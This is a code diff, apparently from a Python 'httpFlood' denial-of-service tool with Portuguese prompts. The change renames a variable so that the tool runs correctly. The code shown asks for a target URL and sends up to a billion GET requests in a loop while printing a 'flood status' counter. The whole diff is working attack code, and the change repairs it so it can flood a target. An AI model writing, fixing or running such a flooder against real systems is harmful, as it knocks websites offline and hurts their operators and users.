@@ -16,15 +16,15 @@ class httpFlood:
 			banner()
 			
 			try:
-				ip = input(Fore.CYAN+"Digite o ip/url (http://url.com): "+Style.RESET_ALL)
+				ip_url = input(Fore.CYAN+"Digite o ip/url (http://url.com): "+Style.RESET_ALL)
 				
 				try:
-					if not url:
+					if not ip_url:
 						print(Fore.YELLOW+"url em branco!!")
 						time.sleep(1)
 						exit()
 						
-					elif url  == "sair":
+					elif ip_url  == "sair":
 						print(Fore.RED+"você saiu!")
 						time.sleep(1)
 						exit()
@@ -35,7 +35,7 @@ class httpFlood:
 					exit()
 				
 				for i in range(1, 1000000000):
-					rqs = requests.get(ip)
+					rqs = requests.get(ip_url)
 					print(Fore.GREEN+f"status do flood:", rqs.status_code, f"{i}"+Style.RESET_ALL)
 					
 			except KeyboardInterrupt:
